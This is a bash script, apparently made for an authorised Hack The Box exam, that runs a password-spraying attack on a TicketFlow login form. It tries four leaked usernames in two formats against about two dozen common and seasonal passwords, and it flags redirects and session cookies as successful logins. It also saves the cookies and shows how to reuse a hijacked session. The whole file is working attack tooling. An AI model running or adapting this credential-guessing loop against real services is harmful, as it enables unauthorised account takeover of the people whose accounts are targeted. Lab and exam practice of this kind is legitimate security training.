#!/usr/bin/env bash
# Task 2 - TicketFlow login probe (staging.phantomkernel.htb).
# Authorized HTB COAE exam, dedicated instance, in scope.
# Usage:  bash exam/scripts/tf_login_test.sh
set -u

IP=154.57.164.73
PORT=31374
HOST=staging.phantomkernel.htb
BASE="http://$HOST:$PORT"
RES="--resolve $HOST:$PORT:$IP"
LOGIN="$BASE/ticketflow/login"

# corporate IDs leaked on the public case desk
USERS="r.hale p.foster l.ng c.ormond"
# username formats to try
FORMATS="%s %s@nexus"
# temporary onboarding passphrase guesses (SSO cutover paused)
PASSES="password Password1 Welcome1 Welcome123 Welcome2025 Nexus2025 Nexus2026 nexus \
changeme onboarding Onboarding1 Onboarding2025 TicketFlow1 Staging2025 Staging2026 \
spring2025 Summer2025 Autumn2025 ChangeMe123 Nexus@2025 Passphrase1 temp1234 \
research research2025 signal2025 committee2025"

echo "[*] target $BASE  (login: $LOGIN)"
echo "[*] baseline (no creds):"
curl -s -o /dev/null -w "    GET login -> %{http_code} size=%{size_download}\n" $RES "$LOGIN"

for u in $USERS; do
  for fmt in $FORMATS; do
    user=$(printf "$fmt" "$u")
    for p in $PASSES; do
      # capture status, size, and any redirect Location
      out=$(curl -s -D - -o /dev/null $RES -c /tmp/tf.jar \
            -d "username=$user&password=$p" "$LOGIN")
      code=$(printf '%s' "$out" | awk 'NR==1{print $2}')
      loc=$(printf '%s' "$out"  | awk 'tolower($1)=="location:"{print $2}' | tr -d '\r')
      setc=$(printf '%s' "$out" | grep -ci -e '^set-cookie')
      size=$(printf '%s' "$out" | wc -c | tr -d ' ')
      flag=""
      # heuristics: a redirect away from login, or a session cookie set, = likely success
      case "$code" in
        30[0-9]) flag=" <== REDIRECT (${loc:-?})" ;;
      esac
      [ "$setc" -gt 0 ] && flag="$flag <== SET-COOKIE"
      printf "%-18s %-16s -> %s hdrsz=%s%s\n" "$user" "$p" "${code:-?}" "$size" "$flag"
    done
  done
done

echo
echo "[*] done. Any line marked REDIRECT or SET-COOKIE is a candidate; the cookie is in /tmp/tf.jar"
echo "[*] to reuse a good login:  curl -s \$RES -b /tmp/tf.jar $BASE/ticketflow/  (dashboard)"
